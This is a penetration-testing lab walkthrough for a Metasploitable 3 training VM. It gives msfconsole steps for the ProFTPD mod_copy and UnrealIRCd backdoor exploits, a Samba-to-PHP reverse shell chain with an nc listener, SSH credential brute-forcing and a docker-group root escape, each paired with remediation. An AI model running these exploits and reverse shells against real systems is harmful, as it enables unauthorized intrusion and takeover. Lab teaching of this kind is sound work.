# Metasploitable 3 Exploitation Walkthrough (Authorized Lab Use Only)

A comprehensive, methodology-first guide to practising penetration testing against a Metasploitable 3 Ubuntu 14.04 VM that you own, on an isolated host-only network. This is a learning document for a student project. Everything here targets an intentionally vulnerable training VM built by Rapid7 for exactly this purpose. Do not point any of it at a machine you do not own and control.

This guide pairs with LabScout. LabScout automates the early phases (reconnaissance and advisory) and provides an optional, gated version-check step. The exploitation phases below are the manual, human-driven learning you do after LabScout points you at something interesting. Keep exploitation out of the bot, which is the whole point of its design.

## 0. Before you start

Three things, every time.

1. Snapshot the VM first. In VirtualBox, take a snapshot right after the VM boots and before you touch it. When you are done, or when something breaks, restore the snapshot. This is how you reset the lab, and it means you can be fearless while practising.
2. Confirm isolation. The Metasploitable 3 VM should be on a VirtualBox Host-Only adapter, not bridged to your real network. Your attacker machine (Kali, or any box running Metasploit and nmap) sits on the same host-only network. Nothing in this lab should be able to reach the internet or your LAN.
3. Keep notes as you go. For each finding, write down the service, version, the vulnerability, what you did, and the evidence. That record is the actual deliverable of a pentest, not the shell itself.

## 1. The methodology (this is the real lesson)

Exploitation is one step in a repeatable process. Learn the process and the individual exploits become interchangeable details. The phases:

1. Reconnaissance. What hosts and services exist.
2. Enumeration. Dig into each service for versions, config, and exposure.
3. Vulnerability identification. Map versions and misconfigurations to known weaknesses.
4. Exploitation. Use a published, understood technique to gain access.
5. Proof of impact. Capture minimal evidence that the access is real.
6. Privilege escalation. Where a foothold can become higher privilege.
7. Documentation and remediation. Write it up, and say how to fix it.

How LabScout maps on: it runs phase 1 and part of phase 2 automatically, writes an advisory summary, and its optional validation step does phase 3-style version confirmation against allowlisted modules. You do phases 4 through 7 by hand, which is where the learning is.

## 2. Lab setup

Prerequisites on the attacker side:
- Metasploit Framework (`msfconsole`). Pre-installed on Kali, or install from the Rapid7 repo.
- Nmap.
- A few small tools: `smbclient`, `enum4linux`, `curl`, `netcat`.

Find the target. From your attacker box, sweep the host-only subnet to find the VM, then confirm:

```
# Example: host-only network is 192.168.56.0/24
nmap -sn 192.168.56.0/24          # ping sweep to find live hosts
```

Note the Metasploitable 3 IP. The rest of this guide calls it `TARGET`. This is the same value you enter and confirm in LabScout, and LabScout will refuse it unless it is private and on your allowlist.

## 3. Phase 1: Reconnaissance

Map the attack surface with a service and version scan, then a full port scan.

```
nmap -sV -sC TARGET               # default scripts + version detection on common ports
nmap -p- -sV TARGET               # all 65535 TCP ports, slower, finds the odd ones
```

This is exactly what LabScout's `quick`, `safe-scripts`, and `services` profiles do, so you can run LabScout here and read its report instead of parsing raw nmap by hand.

On the Ubuntu 14.04 build you should expect to see a spread of deliberately vulnerable services. The common ones, which this guide works through, include:

| Port | Service | Why it matters |
|------|---------|----------------|
| 21 | ProFTPD 1.3.5 | Known unauthenticated RCE via mod_copy |
| 22 | OpenSSH | Weak/default credentials to practise login attacks |
| 80 | Apache + PHP web apps | Web attack surface, and the webroot used by other exploits |
| 445 | Samba | Writable share that can be chained to a web shell |
| 631 | CUPS | Printing service, enumeration practice |
| 2375 | Docker | Exposed Docker, and a group misconfig for privilege escalation |
| 6697 | UnrealIRCd 3.2.8.1 | Backdoored source, trivial command execution |

Your exact set may differ by build version. Go by what your scan actually shows, not by this table.

## 4. Phase 2: Enumeration

For each open service, pull more detail. A few examples:

FTP:
```
nmap -p21 --script ftp-anon,ftp-syst TARGET     # anonymous login? banner?
```

SMB:
```
smbclient -L //TARGET/ -N                        # list shares, no password
enum4linux -a TARGET                             # users, shares, policy
```

HTTP:
```
whatweb http://TARGET/                           # tech fingerprint
# browse to http://TARGET/ and look at what web apps are present
```

The goal of this phase is to turn "port 21 is open" into "ProFTPD 1.3.5 is running and unauthenticated." Versions are what unlock the next phase.

## 5. Phase 3: Vulnerability identification

This is the skill worth building: going from a version string to a known weakness and a module. Three tools do it.

Inside msfconsole:
```
msf > search proftpd
msf > search type:exploit unreal
```

From the shell:
```
searchsploit proftpd 1.3.5
```

And the Rapid7 module database at rapid7.com/db. Search the service name, read what the module does and what it requires before you run anything. Understanding the module is the difference between learning and copy-pasting.

## 6. Phase 4: Exploitation walkthroughs

Each of these uses a published Metasploit module or a documented manual technique against the training VM. For every one, the pattern is the same: select, configure the target, read the options, run, confirm.

### 6a. ProFTPD 1.3.5 mod_copy (CVE-2015-3306)

What it is. ProFTPD 1.3.5 exposes the `SITE CPFR` and `SITE CPTO` commands to unauthenticated clients, which lets anyone copy files around the filesystem with the service's privileges. Because the server can also read `/proc/self/cmdline`, you can smuggle a PHP payload into the web root and then execute it over HTTP. That chain gives remote code execution. This is CVE-2015-3306.

Module: `exploit/unix/ftp/proftpd_modcopy_exec`.

In msfconsole:
```
msf > use exploit/unix/ftp/proftpd_modcopy_exec
msf > set RHOSTS TARGET
msf > set SITEPATH /var/www/html      # the writable web root on this VM
msf > set TARGETURI /                  # URL path that reaches that web root
msf > show options                     # read every option before running
msf > run
```

Confirm. When it lands you get a shell. Run `id` and `hostname`. That is your proof.

Why it works and how to fix it. The server runs an old version with mod_copy enabled and a web root it can write to. Remediation: patch ProFTPD, disable mod_copy if unused, and never let the FTP service write into a web-served directory.

### 6b. UnrealIRCd 3.2.8.1 backdoor

What it is. In 2009 the UnrealIRCd 3.2.8.1 source tarball on a mirror was replaced with a backdoored copy that ran any command prefixed with a specific string. Metasploitable 3 ships that version on purpose. It is a clean lesson in software supply chain compromise.

Module: `exploit/unix/irc/unreal_ircd_3281_backdoor`.

In msfconsole:
```
msf > use exploit/unix/irc/unreal_ircd_3281_backdoor
msf > set RHOST TARGET
msf > set RPORT 6697
msf > set PAYLOAD cmd/unix/reverse_perl
msf > set LHOST <your attacker IP>
msf > run
```

Confirm. You get a shell as the user running the IRC daemon. Run `id`.

Why it works and how to fix it. The binary itself is malicious. Remediation in the real world: verify source integrity with signatures and hashes before building, and you would never run this version.

### 6c. Samba writable share to web shell (manual chain)

What it is. A Samba share is writable by a user who can drop files into the web root. You upload a PHP reverse shell, then trigger it with a web request. This teaches chaining two low-severity findings into code execution.

Steps:
```
# 1. See the shares
smbclient -L //TARGET/ -N

# 2. Connect to the writable share with the known lab user
smbclient //TARGET/<share> -U <user>

# 3. Put a PHP reverse shell (e.g. pentestmonkey's php-reverse-shell.php,
#    edited with your attacker IP and port) into the web root
smb> put php-reverse-shell.php

# 4. Start a listener on your attacker box
nc -lvnp 1234

# 5. Trigger it over HTTP
curl http://TARGET/php-reverse-shell.php
```

Confirm. Your listener catches a shell. Run `id`.

Why it works and how to fix it. The share permissions let an unprivileged user write executable content into a web-served path. Remediation: lock down share write permissions and separate upload directories from anything the web server will execute.

### 6d. SSH weak credentials

What it is. Default or weak credentials are the most common real-world foothold, so it is worth practising. Metasploitable 3 ships with known lab accounts.

Module: `auxiliary/scanner/ssh/ssh_login`.
```
msf > use auxiliary/scanner/ssh/ssh_login
msf > set RHOSTS TARGET
msf > set USER_FILE users.txt          # small lab wordlists
msf > set PASS_FILE passwords.txt
msf > run
```

Confirm. A valid pair opens a session. This is also a good place to understand why rate limiting, key-based auth, and strong passwords matter.

Remediation: disable password auth in favour of keys, enforce strong credentials, and alert on repeated failures.

## 7. Phase 5: Proof of impact (keep it minimal)

Once you have a shell, prove it and stop. For a lab writeup, this is enough:

```
id                 # who am I
hostname           # which box
uname -a           # kernel/OS
ls -la /home       # context
```

Take a screenshot. Do not install persistence, do not pivot to other hosts, do not pull data out, do not dump credentials. That restraint is not just lab etiquette. It mirrors how LabScout is built and how real authorized engagements are scoped, and it is the habit that keeps you on the right side of the line.

## 8. Phase 6: Privilege escalation (one worked example)

A foothold is often a low-privilege user. Turning that into root is its own skill. One clean example on this VM:

The Docker group escape. If the user you landed as is in the `docker` group, they can run containers, and a container can mount the host filesystem. That is effectively root.

Concept:
```
# as a user in the docker group
docker run -v /:/mnt --rm -it ubuntu chroot /mnt sh
# now you are operating on the host filesystem as root inside the chroot
```

Confirm with `id` showing root context, grab your proof, and stop.

Why it works and how to fix it. Membership in the `docker` group is equivalent to root, because the Docker daemon runs as root and will mount anything. Remediation: treat `docker` group membership as root-equivalent and grant it only to trusted admins.

## 9. Documentation and remediation

For each finding, record a short entry: target, port, service and version, the vulnerability (CVE where there is one), the module or method, the evidence you captured, and the fix. LabScout's `report.py` already produces the recon and advisory part of this in Markdown, so your manual exploitation notes slot in underneath it to form a complete writeup.

Writing the remediation column is where a blue-team mindset pays off. Every exploit above has a concrete fix, and being able to state it is what separates a report that helps an organization from one that just shows off access.

## 10. Resetting the lab

Restore the VirtualBox snapshot you took in step 0. Because Metasploitable 3 is built locally from the Rapid7 repository rather than shipped as an image, you can also rebuild it from scratch if you ever need a truly clean slate.

## 11. How this fits with LabScout

LabScout is deliberately the recon-and-advise layer. It finds and fingerprints services, explains them, and can run a tightly allowlisted version check against the one confirmed target. It never exploits. The walkthroughs above are the human part of the workflow: LabScout tells you ProFTPD 1.3.5 is listening, and you take it from there, manually and deliberately, with a confirmation at every step. Keeping the exploitation out of the automation is a feature, not a limitation.

## 12. Safe next steps and resources

- Metasploit Unleashed, the free course from OffSec, for the framework itself.
- The Rapid7 module database at rapid7.com/db to read what each module does before you run it.
- The Metasploitable 3 repository at github.com/rapid7/metasploitable3 for the full list of what is intentionally vulnerable on your build.
- Once you are comfortable, build a second isolated VM and practise the whole methodology from a blank nmap scan, which is closer to a real engagement than following a walkthrough.

## Sources

- ProFTPD mod_copy module, Rapid7: https://www.rapid7.com/db/modules/exploit/unix/ftp/proftpd_modcopy_exec
- CVE-2015-3306 (ProFTPD 1.3.5 mod_copy): https://www.exploit-db.com/exploits/37262
- Metasploitable 3 walkthrough (UnrealIRCd, Samba, Docker escape): https://blog.securelayer7.net/metasploitable-3-walkthrough-part-2/
- Metasploitable 3 project and vulnerability list: https://github.com/rapid7/metasploitable3
